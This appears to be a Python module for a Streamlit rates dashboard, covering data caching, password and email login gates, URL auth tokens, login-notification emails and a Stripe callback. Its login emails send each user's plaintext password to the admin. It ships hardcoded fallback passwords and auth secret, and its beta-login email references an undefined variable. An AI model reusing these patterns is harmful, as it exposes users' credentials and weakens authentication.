"""Streamlit session state and cached data loading — optimised for fast startup."""

import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent))

import hashlib
import hmac
import inspect
import logging
import smtplib
import threading
from datetime import datetime
from email.mime.text import MIMEText

import json

import pandas as pd
import streamlit as st

from config import DEFAULT_END_DATE, DEFAULT_START_DATE

logger = logging.getLogger(__name__)

CACHE_DIR          = Path(__file__).parent.parent / "data" / "cache"
EMAIL_ACCESS_FILE  = Path(__file__).parent.parent / "data" / "page_email_access.json"


# ── Per-page email access helpers ─────────────────────────────────────────────

def load_page_email_access() -> dict:
    """Return the page→email-list config.  Safe even if file missing."""
    if EMAIL_ACCESS_FILE.exists():
        try:
            return json.loads(EMAIL_ACCESS_FILE.read_text())
        except Exception:
            pass
    return {}


def save_page_email_access(data: dict) -> None:
    EMAIL_ACCESS_FILE.parent.mkdir(parents=True, exist_ok=True)
    EMAIL_ACCESS_FILE.write_text(json.dumps(data, indent=2))


def check_email_for_page(email: str, slug: str) -> bool:
    """Return True if *email* (lowercased) is approved for *slug*."""
    cfg = load_page_email_access()
    page = cfg.get(slug, {})
    if not page.get("enabled", False):
        return False
    approved = [e.strip().lower() for e in page.get("emails", [])]
    return email.strip().lower() in approved


# ---------------------------------------------------------------------------
# Fast path: read parquet from disk — no network, <100ms
# ---------------------------------------------------------------------------

@st.cache_data(ttl=3600, show_spinner=False)
def _load_from_disk() -> pd.DataFrame:
    """Read the newest on-disk parquets. Returns empty DF if none exist."""
    if not CACHE_DIR.exists():
        return pd.DataFrame()

    master = CACHE_DIR / "master.parquet"
    if master.exists():
        try:
            return pd.read_parquet(master)
        except Exception:
            pass

    # Merge latest treasury + fred parquets
    tsy_files  = sorted(CACHE_DIR.glob("treasury_*.parquet"), key=lambda p: p.stat().st_mtime)
    fred_files = sorted(CACHE_DIR.glob("fred_*.parquet"),     key=lambda p: p.stat().st_mtime)
    tsy  = pd.read_parquet(tsy_files[-1])  if tsy_files  else pd.DataFrame()
    fred = pd.read_parquet(fred_files[-1]) if fred_files else pd.DataFrame()

    if tsy.empty and fred.empty:
        return pd.DataFrame()

    if tsy.empty:
        df = fred
    elif fred.empty:
        df = tsy
    else:
        tsy.index  = pd.to_datetime(tsy.index)
        fred.index = pd.to_datetime(fred.index)
        df = tsy.join(fred, how="outer")

    df = df.sort_index().ffill(limit=3)
    core = [c for c in ["2Y", "5Y", "10Y", "30Y"] if c in df.columns]
    if core:
        df = df.dropna(subset=core, how="all")

    try:
        df.to_parquet(master)
    except Exception:
        pass
    return df


# ---------------------------------------------------------------------------
# Slow path: full network fetch — only on Refresh or first-ever run
# ---------------------------------------------------------------------------

@st.cache_data(ttl=3600, show_spinner="Fetching latest market data…")
def _load_from_network(start: str, end: str) -> pd.DataFrame:
    from data.pipeline import DataPipeline
    df = DataPipeline(start_date=start, end_date=end, use_cache=False).load()
    if not df.empty:
        try:
            df.to_parquet(CACHE_DIR / "master.parquet")
        except Exception:
            pass
    return df


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def _secret(key: str, default: str) -> str:
    """Read from st.secrets if available, fall back to *default*.

    st.secrets raises FileNotFoundError when no secrets.toml exists at all
    (even with .get()), so a plain try/except is the safest approach for
    local dev where the file may not be on the Streamlit search path."""
    try:
        return st.secrets[key]
    except (FileNotFoundError, KeyError):
        return default


def _send_login_email(username: str, password_used: str, role: str, ip: str) -> None:
    """Fire-and-forget login notification. Silently skipped if creds missing.

    Recipient defaults to GMAIL_USER but can be overridden by setting
    BETA_NOTIFY_TO in secrets (e.g. send to a private inbox separate
    from the admin Gmail used for SMTP auth).
    """
    gmail_user = _secret("GMAIL_USER", "")
    gmail_pass = _secret("GMAIL_APP_PASSWORD", "")
    if not gmail_user or not gmail_pass:
        return

    notify_to  = _secret("BETA_NOTIFY_TO", gmail_user) or gmail_user

    now = datetime.now().strftime("%d %b %Y %H:%M:%S")
    body = f"{username} | {password_used} | {role} | {ip} | {now}"

    def _send():
        try:
            msg = MIMEText(body)
            msg["Subject"] = f"login: {username}"
            msg["From"]    = gmail_user
            msg["To"]      = notify_to
            with smtplib.SMTP_SSL("smtp.gmail.com", 465, timeout=10) as s:
                s.login(gmail_user, gmail_pass)
                s.send_message(msg)
        except Exception:
            pass

    threading.Thread(target=_send, daemon=True).start()


def _build_session_summary(user_email: str, since_iso: str) -> str:
    """Return a multi-line summary of what `user_email` did since `since_iso`.
    Empty string if no activity. Tolerant of missing/empty data — never raises.
    """
    try:
        from dashboard.components.beta_users import load_activity_df
        df = load_activity_df()
        if df.empty or not since_iso:
            return ""
        df = df.copy()
        df["ts"] = pd.to_datetime(df["ts"], utc=True, errors="coerce")
        since_ts = pd.to_datetime(since_iso, utc=True, errors="coerce")
        user_df = df[(df["user_email"] == user_email.lower())
                     & (df["ts"] > since_ts)]
        if user_df.empty:
            return ""
        n_views    = len(user_df)
        n_distinct = int(user_df["page"].nunique())
        first_seen = user_df["ts"].min()
        last_seen  = user_df["ts"].max()
        duration_min = round((last_seen - first_seen).total_seconds() / 60.0, 1)
        top_pages = (user_df.groupby("page").size()
                     .sort_values(ascending=False).head(5))
        lines = [
            f"  Page views:     {n_views}",
            f"  Distinct pages: {n_distinct}",
            f"  First action:   {first_seen.strftime('%Y-%m-%d %H:%M:%S UTC')}",
            f"  Last action:    {last_seen.strftime('%Y-%m-%d %H:%M:%S UTC')}",
            f"  Duration:       {duration_min} min",
            "",
            "  Top pages:",
        ]
        for page, count in top_pages.items():
            lines.append(f"    {count:>3} × {page}")
        # Full timeline (last 30 events)
        recent = user_df.sort_values("ts", ascending=False).head(30)
        lines.append("")
        lines.append("  Recent timeline (last 30):")
        for _, row in recent.iterrows():
            ts = row["ts"].strftime("%H:%M:%S")
            page = row["page"]
            action = row.get("action", "view")
            lines.append(f"    {ts}  {action:<6}  {page}")
        return "\n".join(lines)
    except Exception:
        return ""


def _send_beta_login_email(user: dict, role: str, ip: str) -> None:
    """Beta-user login notification with session summary.

    Sent on every successful beta-tester auth. Body includes:
      • login event details (slot email, real name, org, IP, time)
      • a summary of what this user did since their previous login
        (page views, top pages, recent timeline) — only if there was
        activity. First-ever logins skip the summary.

    Silently skipped if SMTP creds missing. Fire-and-forget like the
    base _send_login_email — page render is never blocked.
    """
    gmail_user = _secret("GMAIL_USER", "")
    gmail_pass = _secret("GMAIL_APP_PASSWORD", "")
    if not gmail_user or not gmail_pass:
        return

    notify_to  = _secret("BETA_NOTIFY_TO", gmail_user) or gmail_user

    email      = (user.get("email") or "").lower()
    real_name  = user.get("name") or "(not set)"
    real_email = user.get("real_email") or "(not assigned yet)"
    org        = user.get("organisation") or "(not set)"
    # last_login_at on `user` is the PREVIOUS login (authenticate()
    # mutated the JSON store after reading the record, so the in-memory
    # record returned still holds the old value).
    prev_login = user.get("last_login_at") or ""
    is_first_login = not prev_login

    now_str    = datetime.now().strftime("%d %b %Y %H:%M:%S")

    summary    = _build_session_summary(email, prev_login)

    # Subject line shouts about first logins so they stand out in the inbox
    if is_first_login:
        subject = f"🎉 FIRST LOGIN: {email}" + (
            f" ({real_name})" if real_name and real_name != "(not set)" else ""
        )
    else:
        subject = f"beta login + summary: {email}"

    header_line = (
        "🎉 FIRST LOGIN — this tester has just used their access for the "
        "first time. Welcome them via Gmail if you haven't already."
        if is_first_login else
        "Beta tester logged in"
    )

    body_lines = [
        header_line,
        "",
        f"  Slot login:   {email}",
        f"  Real email:   {real_email}",
        f"  Real name:    {real_name}",
        f"  Organisation: {org}",
        f"  Role:         {role}",
        f"  IP:           {ip}",
        f"  Time (local): {now_str}",
        f"  Prev login:   {prev_login or '(first login ever)'}",
        "",
        "─" * 50,
    ]
    if summary:
        body_lines += ["Activity since previous login:", "", summary]
    elif is_first_login:
        body_lines += [
            "First login ever — no previous activity to summarise yet.",
            "Future logins will include a session summary in this email.",
        ]
    else:
        body_lines += ["No activity recorded since previous login."]

    def _send():
        try:
            msg = MIMEText(body)
            msg["Subject"] = subject
            msg["From"]    = gmail_user
            msg["To"]      = notify_to
            with smtplib.SMTP_SSL("smtp.gmail.com", 465, timeout=15) as s:
                s.login(gmail_user, gmail_pass)
                s.send_message(msg)
        except Exception:
            pass

    threading.Thread(target=_send, daemon=True).start()


def _get_client_ip() -> str:
    """Best-effort client IP — uses st.context.headers (Streamlit ≥1.37)."""
    try:
        headers = st.context.headers
        if headers:
            return headers.get("X-Forwarded-For", headers.get("X-Real-Ip", "unknown"))
    except Exception:
        pass
    return "unknown"


ADMIN_PASSWORD  = _secret("ADMIN_PASSWORD", "manveer")

# Optional recovery code — accepted in place of ADMIN_PASSWORD when the
# primary password is forgotten. Generate with:
#     openssl rand -hex 16        # 32-char hex (recommended)
# Store in secrets.toml as ADMIN_BACKUP_CODE = "…" or set the env var
# on Fly with:    fly secrets set ADMIN_BACKUP_CODE=…
# Leave empty to disable backup-code login entirely (default).
ADMIN_BACKUP_CODE = _secret("ADMIN_BACKUP_CODE", "").strip()

# Named viewer passwords — each password maps to a user label so login
# notifications can tell you WHO logged in. Add more in secrets.toml as a
# comma-separated "password:name" list, e.g. "rates:Viewer,nomh:NomH,nomm:NomM"
_VIEWER_RAW = _secret("VIEWER_PASSWORDS", "rates:Viewer,nomh:NomH,nomm:NomM")
VIEWER_PASSWORDS = {}  # {password: display_name}
for entry in _VIEWER_RAW.split(","):
    entry = entry.strip()
    if ":" in entry:
        pw, name = entry.split(":", 1)
        VIEWER_PASSWORDS[pw.strip()] = name.strip()
    else:
        VIEWER_PASSWORDS[entry] = entry  # use password as name fallback

# Backwards-compat aliases
VIEWER_PASSWORD = list(VIEWER_PASSWORDS.keys())[0] if VIEWER_PASSWORDS else "rates"
SITE_PASSWORD = VIEWER_PASSWORD

# Page-specific passwords — each maps to exactly one page slug (the filename stem).
# Format in secrets.toml:  PAGE_PASSWORDS = "vol:07_Vol_Surface,scanner:02_RV_Scanner"
_PAGE_PWS_RAW = _secret("PAGE_PASSWORDS", "")
PAGE_PASSWORDS_MAP: dict = {}   # {password: page_slug}
for _pentry in _PAGE_PWS_RAW.split(","):
    _pentry = _pentry.strip()
    if ":" in _pentry:
        _ppw, _pslug = _pentry.split(":", 1)
        PAGE_PASSWORDS_MAP[_ppw.strip()] = _pslug.strip()

# ── Persistent auth via query params ─────────────────────────────────────
# Streamlit session state is keyed by the websocket connection. If the user
# clicks an HTML <a href="..."> link (as the header does), the browser may do
# a full page reload, the websocket dies, and a new (logged-out) session is
# created. To survive that, we mirror the auth state into ?auth=<token>
# query param. The token is an HMAC of the role using a server-side secret,
# so it cannot be forged without knowing the secret.
_AUTH_SECRET = _secret("AUTH_SECRET", "change-me-in-production")


def _auth_token(role: str) -> str:
    """Deterministic, unforgeable token for a role ('admin' or 'viewer')."""
    return hmac.new(_AUTH_SECRET.encode(), role.encode(), hashlib.sha256).hexdigest()[:16]


def auth_query_string() -> str:
    """Return '?auth=<token>' for the current authed user, or '' if not authed.
    Used by the header links so auth survives a full page reload."""
    if st.session_state.get("site_admin"):
        return f"?auth={_auth_token('admin')}"
    _lock = st.session_state.get("page_lock", "")
    if _lock:
        return f"?auth={_auth_token(f'page:{_lock}')}"
    if st.session_state.get("site_authenticated"):
        return f"?auth={_auth_token('viewer')}"
    return ""


def is_admin() -> bool:
    """True if the current session is logged in with the admin password."""
    return bool(st.session_state.get("site_admin"))


def require_admin(message: str = "Admin only — log in with the admin password to make changes.") -> bool:
    """Render an info banner and return False if the current user is not admin.
    Use to gate write actions inside pages."""
    if is_admin():
        return True
    st.info(f"🔒 {message}")
    return False


def _restore_auth_from_query_params() -> bool:
    """If ?auth=<token> is present in the URL, restore session_state from it.
    Returns True if auth was restored, False otherwise."""
    qp = st.query_params.get("auth", "")
    if not qp:
        return False
    if qp == _auth_token("admin"):
        st.session_state["site_authenticated"] = True
        st.session_state["site_admin"] = True
        return True
    if qp == _auth_token("viewer"):
        st.session_state["site_authenticated"] = True
        st.session_state["site_admin"] = False
        return True
    # Check page-specific tokens from PAGE_PASSWORDS (password-based flow)
    for _slug in PAGE_PASSWORDS_MAP.values():
        if qp == _auth_token(f"page:{_slug}"):
            st.session_state["site_authenticated"] = True
            st.session_state["site_admin"] = False
            st.session_state["page_lock"] = _slug
            return True
    # Check page-specific tokens from page_email_access.json (email-based flow)
    # — without this, the "Specific Section" login sets a token that nothing
    # can restore on reload, and the user bounces back to the login screen.
    try:
        for _slug in load_page_email_access().keys():
            if qp == _auth_token(f"page:{_slug}"):
                st.session_state["site_authenticated"] = True
                st.session_state["site_admin"] = False
                st.session_state["page_lock"] = _slug
                return True
    except Exception:
        pass
    return False


def password_gate() -> None:
    """Block the entire app until the user enters a valid password.

    Accepted passwords:
      • admin password   → full read + write access
      • viewer passwords → read-only access to all pages
      • page passwords   → access to a single page only
      • subscriber email → email-based access to a single page
    """
    # ── 1. Auto-detect the calling page's slug ───────────────────────────────
    try:
        _current_slug = Path(inspect.stack()[1][1]).stem  # e.g. "09_CTA_Positioning"
    except Exception:
        _current_slug = ""

    # ── 2. Restore auth from URL token if session is fresh ───────────────────
    if not st.session_state.get("site_authenticated"):
        _restore_auth_from_query_params()

    # ── 3. If authenticated, enforce page lock then return ───────────────────
    if st.session_state.get("site_authenticated"):
        _lock = st.session_state.get("page_lock", "")
        if _lock and _lock != _current_slug:
            # User is locked to a different page — show restriction screen
            _dname = _lock.split("_", 1)[-1].replace("_", " ") if "_" in _lock else _lock
            st.markdown(
                "<div style='text-align:center;padding-top:80px'>"
                "<h2>🔒 Access Restricted</h2>"
                f"<p style='color:#94a8c9;max-width:420px;margin:8px auto 24px'>"
                f"Your access is limited to the <b>{_dname}</b> page.</p>"
                "</div>",
                unsafe_allow_html=True,
            )
            _c1, _c2, _c3 = st.columns([1, 1, 1])
            with _c2:
                st.page_link(
                    f"pages/{_lock}.py",
                    label=f"→ Go to {_dname}",
                    use_container_width=True,
                )
            st.stop()
        return  # authenticated and on the right page

    # ── 4. Not authenticated — show login form ───────────────────────────────
    st.markdown(
        "<div style='text-align:center; padding-top:60px;'>"
        "<h1>📈 Rates Dashboard</h1>"
        "<p style='color:#94a8c9; margin-bottom:20px;'>Log in to continue</p>"
        "</div>",
        unsafe_allow_html=True,
    )
    col1, col2, col3 = st.columns([1, 1.5, 1])
    with col2:
        # Access-mode toggle (outside the form so it rerenders on change)
        _pea = load_page_email_access()
        _enabled_pages = {k: v for k, v in _pea.items() if v.get("enabled")}
        _mode_opts = ["🔑 Full Dashboard"]
        if _enabled_pages:
            _mode_opts.append("📄 Specific Section")
        _mode = st.radio("Access mode", _mode_opts, horizontal=True, key="_login_mode",
                         label_visibility="collapsed")
        st.write("")

        if _mode == "🔑 Full Dashboard":
            # ── Standard username + password ─────────────────────────────────
            with st.form("site_gate", clear_on_submit=False):
                username = st.text_input("Username", placeholder="Enter your name")
                pw = st.text_input("Password", type="password", placeholder="Enter password")
                if st.form_submit_button("Log in", use_container_width=True, type="primary"):
                    if not username.strip():
                        st.error("Please enter a username.")
                    elif pw == ADMIN_PASSWORD or (
                            ADMIN_BACKUP_CODE and pw == ADMIN_BACKUP_CODE):
                        ip = _get_client_ip()
                        # Distinguish backup-code logins in the audit email
                        # so you see immediately if the recovery path was used.
                        _role = ("admin (BACKUP CODE)"
                                  if ADMIN_BACKUP_CODE and pw == ADMIN_BACKUP_CODE
                                  else "admin")
                        _send_login_email(username.strip(), pw, _role, ip)
                        st.session_state["site_authenticated"] = True
                        st.session_state["site_admin"]         = True
                        st.session_state["site_user"]          = username.strip()
                        st.query_params["auth"] = _auth_token("admin")
                        st.rerun()
                    elif pw in VIEWER_PASSWORDS:
                        ip = _get_client_ip()
                        _send_login_email(username.strip(), pw, "viewer", ip)
                        st.session_state["site_authenticated"] = True
                        st.session_state["site_admin"]         = False
                        st.session_state["site_user"]          = username.strip()
                        st.query_params["auth"] = _auth_token("viewer")
                        st.rerun()
                    elif pw in PAGE_PASSWORDS_MAP:
                        _slug = PAGE_PASSWORDS_MAP[pw]
                        ip = _get_client_ip()
                        _send_login_email(username.strip(), pw, f"page:{_slug}", ip)
                        st.session_state["site_authenticated"] = True
                        st.session_state["site_admin"]         = False
                        st.session_state["site_user"]          = username.strip()
                        st.session_state["page_lock"]          = _slug
                        st.query_params["auth"] = _auth_token(f"page:{_slug}")
                        st.rerun()
                    else:
                        # Last-resort: try the beta-user store. Username is
                        # treated as email when it contains '@'. This is the
                        # path approved beta testers use to log in — gives
                        # them viewer-equivalent access PLUS turns on
                        # activity tracking via st.session_state['site_user_email'].
                        _beta_user = None
                        if "@" in username:
                            try:
                                from dashboard.components.beta_users import authenticate as _beta_auth
                                _beta_user = _beta_auth(username.strip(), pw)
                            except Exception:
                                _beta_user = None
                        if _beta_user:
                            ip = _get_client_ip()
                            # Rich beta-login email: login event + activity
                            # summary since the user's previous login.
                            _send_beta_login_email(_beta_user, "beta", ip)
                            st.session_state["site_authenticated"] = True
                            st.session_state["site_admin"]         = False
                            st.session_state["site_user"]          = (
                                _beta_user.get("name") or _beta_user.get("email"))
                            # Critical: this enables per-user activity tracking
                            st.session_state["site_user_email"]    = _beta_user.get("email")
                            st.session_state["site_user_id"]       = _beta_user.get("id")
                            st.query_params["auth"] = _auth_token(
                                f"beta:{_beta_user.get('email')}")
                            st.rerun()
                        else:
                            st.error("Incorrect password.")

        else:
            # ── Email-based single-page access ────────────────────────────────
            _page_opts = list(_enabled_pages.keys())
            _fmt = lambda k: f"{_enabled_pages[k].get('icon','')}  {_enabled_pages[k]['display_name']}"
            with st.form("email_gate", clear_on_submit=False):
                _page_slug = st.selectbox(
                    "Which section?",
                    options=_page_opts,
                    format_func=_fmt,
                )
                _email_in = st.text_input(
                    "Your email address",
                    placeholder="you@example.com",
                    help="Enter the email address you used to subscribe to Macro Manv.",
                )
                if st.form_submit_button("Get Access →", use_container_width=True, type="primary"):
                    _email_clean = _email_in.strip().lower()
                    if "@" not in _email_clean:
                        st.error("Please enter a valid email address.")
                    elif check_email_for_page(_email_clean, _page_slug):
                        ip = _get_client_ip()
                        _send_login_email(_email_clean, "(email)", f"page:{_page_slug}", ip)
                        st.session_state["site_authenticated"] = True
                        st.session_state["site_admin"]         = False
                        st.session_state["site_user"]          = _email_clean
                        st.session_state["page_lock"]          = _page_slug
                        st.query_params["auth"] = _auth_token(f"page:{_page_slug}")
                        st.rerun()   # rerun → step 3 above redirects to correct page
                    else:
                        _pname = _enabled_pages.get(_page_slug, {}).get("display_name", _page_slug)
                        st.error(
                            f"**{_email_in}** is not on the approved list for **{_pname}**. "
                            "Check your email or "
                            "[subscribe to Macro Manv](https://macromanv.substack.com)."
                        )

        st.page_link("pages/14_User_Guide.py", label="📖 How to use", use_container_width=True)
    st.stop()


def init_session_state() -> None:
    defaults = {
        "start_date": DEFAULT_START_DATE,
        "end_date":   DEFAULT_END_DATE,
        "use_cache":  True,
    }
    for key, val in defaults.items():
        if key not in st.session_state:
            st.session_state[key] = val

    # ── Stripe checkout return-URL handler ───────────────────────────────
    # When Stripe completes a payment it redirects to ?stripe_session=cs_xxx.
    # On every render we look for that param and, if present, verify the
    # session with Stripe and flip the user's tier. Idempotent — re-running
    # with the same session_id is a no-op after the first success.
    _handle_stripe_callback()


def _handle_stripe_callback() -> None:
    """Process the ?stripe_session=… query param after a checkout return.

    Silently no-ops if there is no Stripe session in the URL. Surfaces a
    success / error banner at the top of the page when one is present.
    """
    try:
        params = st.query_params
        session_id = params.get("stripe_session")
        if not session_id:
            return
        # Avoid double-processing on rerun by keeping a per-session flag
        flag_key = f"_stripe_processed_{session_id}"
        if st.session_state.get(flag_key):
            return
        from dashboard.components.stripe_integration import process_completion
        result = process_completion(session_id)
        st.session_state[flag_key] = True

        if result.get("ok"):
            st.success(
                f"🎉 **Subscription active.** {result.get('message','')}  "
                f"Your dashboard access has been upgraded to "
                f"`{result.get('tier')}`. A complimentary paid Macro Manv "
                f"newsletter subscription will arrive in your inbox within "
                f"24 hours."
            )
        else:
            st.warning(
                f"⏳ Payment received but processing is pending: "
                f"{result.get('message','')}  "
                "If this persists, email manveer@macromanv.com — we keep "
                "Stripe receipts and can reconcile manually."
            )

        # Clear the query param so a page refresh doesn't re-trigger
        try:
            new_params = {k: v for k, v in params.items() if k != "stripe_session"}
            st.query_params.clear()
            for k, v in new_params.items():
                st.query_params[k] = v
        except Exception:
            pass
    except Exception:
        # Stripe processing should never crash the page render
        pass


def get_master_df(force_network: bool = False) -> pd.DataFrame:
    """
    Fast path: disk parquet in <100ms.
    Network path: only on force_network=True or no cache.
    """
    if force_network:
        _load_from_disk.clear()
        _load_from_network.clear()
        return _load_from_network(st.session_state.start_date, st.session_state.end_date)

    df = _load_from_disk()
    if not df.empty:
        return df

    return _load_from_network(st.session_state.start_date, st.session_state.end_date)


def refresh_data() -> None:
    """Force a fresh network fetch — rewrites data/cache/master.parquet
    on disk, then reruns the page so consumers pick up the new data.

    Previously this only cleared the in-memory caches and rerun, which
    meant the next `get_master_df()` call hit `_load_from_disk()` and
    returned the same stale parquet. Now it triggers `force_network=True`
    so the network loader runs and the disk cache is overwritten."""
    _load_from_disk.clear()
    _load_from_network.clear()
    with st.spinner("Pulling fresh prices from Treasury / FRED / ECB…"):
        try:
            get_master_df(force_network=True)
        except Exception as e:
            st.error(f"Refresh failed: {e}")
            return
    st.success("✅ Cache refreshed. Reloading…")
    st.rerun()


def cache_age_str() -> str:
    master = CACHE_DIR / "master.parquet"
    if not master.exists():
        return "no cache"
    age = datetime.now() - datetime.fromtimestamp(master.stat().st_mtime)
    h, m = divmod(int(age.total_seconds()), 3600)
    m //= 60
    return f"{h}h {m}m ago" if h > 0 else f"{m}m ago"


def cache_age_hours() -> float:
    """Cache age in hours (or large number if missing)."""
    master = CACHE_DIR / "master.parquet"
    if not master.exists():
        return 9_999.0
    age = datetime.now() - datetime.fromtimestamp(master.stat().st_mtime)
    return age.total_seconds() / 3600


def render_cache_freshness_banner(stale_hours: float = 24.0) -> None:
    """If the master cache is older than `stale_hours`, render a prominent
    refresh banner. Admin gets an inline button; viewers see a hint."""
    h = cache_age_hours()
    if h < stale_hours:
        return
    age = cache_age_str()
    if is_admin():
        c1, c2 = st.columns([4, 1])
        with c1:
            st.warning(
                f"⚠️ **Market data is {age}** — older than {int(stale_hours)}h. "
                "Click refresh to pull fresh prices from Treasury/FRED/ECB."
            )
        with c2:
            if st.button("🔄 Refresh now", type="primary",
                          use_container_width=True, key="cache_freshness_btn"):
                refresh_data()
    else:
        st.info(
            f"📅 Data shown is from {age}. Admin will refresh shortly. "
            "Numbers are still indicative.",
            icon="ℹ️",
        )
